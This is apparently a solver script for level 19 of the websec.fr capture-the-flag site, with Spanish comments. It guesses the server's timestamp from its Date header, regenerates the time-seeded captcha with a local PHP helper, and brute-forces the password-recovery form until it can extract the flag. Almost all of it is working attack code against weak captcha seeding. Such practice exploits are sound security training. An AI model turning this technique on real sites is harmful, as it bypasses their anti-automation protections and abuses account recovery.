#!/usr/bin/env python3
"""
Exploit de fuerza bruta simple para level19
"""

import requests
import time
import subprocess
from html.parser import HTMLParser
import sys
from datetime import datetime

URL = "https://websec.fr/level19/index.php"

class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None
    
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            attrs_dict = dict(attrs)
            if attrs_dict.get('name') == 'token':
                self.token = attrs_dict.get('value')

def gen_captcha(seed):
    r = subprocess.run(['php', 'gen_captcha.php', str(seed)],
                      capture_output=True, text=True, timeout=1,
                      cwd='/workspace/websec_level19')
    return r.stdout.strip() if r.returncode == 0 else None

print("[*] Brute force para websec level19")
print(f"[*] Hora actual: {datetime.now()}\n")

attempts = 0
start_time = time.time()

while attempts < 300:
    attempts += 1
    
    if attempts % 10 == 0:
        elapsed = time.time() - start_time
        rate = attempts / elapsed
        sys.stdout.write(f"\r[*] Intento {attempts}/300 ({rate:.1f} intentos/s)...")
        sys.stdout.flush()
    
    try:
        s = requests.Session()
        
        # GET
        r1 = s.get(URL, timeout=10)
        
        p = TokenParser()
        p.feed(r1.text)
        
        if not p.token:
            continue
        
        # Obtener timestamp del servidor del header Date
        if 'Date' in r1.headers:
            from email.utils import parsedate_to_datetime
            server_ts = int(parsedate_to_datetime(r1.headers['Date']).timestamp())
        else:
            server_ts = int(time.time())
        
        # Probar varios timestamps
        for offset in [-10, -5, -2, -1, 0, 1, 2, 5, 10]:
            seed = server_ts + offset
            cap = gen_captcha(seed)
            
            if not cap:
                continue
            
            r2 = s.post(URL, data={'captcha': cap, 'token': p.token, 'submit': ''}, timeout=10)
            
            if 'Password recovery email sent' in r2.text:
                print(f"\n\n[+] ¡ÉXITO EN EL INTENTO {attempts}!")
                print(f"[+] Timestamp: {seed}")
                print(f"[+] Captcha: {cap}")
                
                import re
                fm = re.search(r'WEBSEC\{[^}]+\}', r2.text)
                if fm:
                    print(f"\n[+] FLAG: {fm.group(0)}")
                    with open('/workspace/websec_level19/flag.txt', 'w') as f:
                        f.write(fm.group(0) + '\n')
                else:
                    print("\n[*] Flag enviada por email")
                
                sys.exit(0)
            
            elif 'Invalid session token' in r2.text:
                break
    
    except Exception as e:
        pass
    
    time.sleep(0.01)

print("\n[-] No se encontró")
sys.exit(1)